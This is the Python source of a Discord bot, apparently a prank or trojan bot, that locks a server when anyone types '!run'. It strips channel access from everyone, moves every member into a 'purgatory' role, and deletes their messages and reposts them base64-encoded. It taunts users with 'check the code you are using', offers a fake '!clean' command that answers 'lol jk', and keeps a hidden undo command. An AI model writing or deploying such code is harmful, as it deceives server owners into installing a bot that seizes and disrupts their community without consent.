#!/usr/bin/python3
"""
Started with
@see https://realpython.com/how-to-make-a-discord-bot-python/#creating-a-bot
"""
import os
import time  # for sleeping
import discord
import base64 as c
from dotenv import load_dotenv

load_dotenv()
cc = c.b64decode
ccc = c.b64encode
TOKEN = os.getenv('token')  ## there is a file called `.env` that contains token='here'

intents = discord.Intents.default()
intents.members = True
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'{client.user} has awoken!')


@client.event
async def on_message(message):
    if message.content == "!run":
        if 'purgatory' in [channel.name for channel in message.guild.channels]:
            await message.reply("Already done that")
        else:
            # restrict all current channels to a new role
            eh_cr = await message.guild.create_role(name="elite haxor")
            for channel in message.guild.channels:
                await channel.set_permissions(eh_cr, read_messages=True, send_messages=True)
                await channel.set_permissions(message.guild.default_role, read_messages=False, send_messages=False)
            
            channel = await message.guild.create_text_channel('purgatory')
            vchannel = await message.guild.create_voice_channel('purgatory')
            time.sleep(3)
            await channel.send("Welcome to purgatory")
            time.sleep(2)
            await channel.send("In the future its always good to check the code you are using")

        if "purgatory" not in [role.name for role in message.guild.roles]:
            pu_cr = await message.guild.create_role(name="purgatory")
            # assign all members to purgatory role
            for user in await message.guild.fetch_members(limit=None).flatten(): 
                await user.add_roles(pu_cr)  # will add everyone on the server to the purgatory role
        

    elif message.content == "!clean":
        await message.reply("Cleaning up & restoring server")
        time.sleep(3)
        await message.channel.send("lol jk")
    elif message.content == "!super_secret_command":
        await message.reply("Nice! one sec")
        time.sleep(1)  # a nice delay
        for role in message.guild.roles:
            if role.name == "purgatory" or role.name == "elite haxor":
                await role.delete()  # manage_roles permission needed
        for channel in message.guild.channels:
            await channel.set_permissions(message.guild.default_role, read_messages=True, send_messages=True)
            if channel.name == "purgatory":
                await channel.delete()
    if 'purgatory' in [channel.name for channel in message.guild.channels]:
          #Will delete all messages and encode them to b64
            print(message.content)
            if message.author != client.user:
              await message.delete()
              message_bytes = message.content.encode('ascii')
              encoded = ccc(message_bytes)
              await message.channel.send(encoded)
client.run(TOKEN)
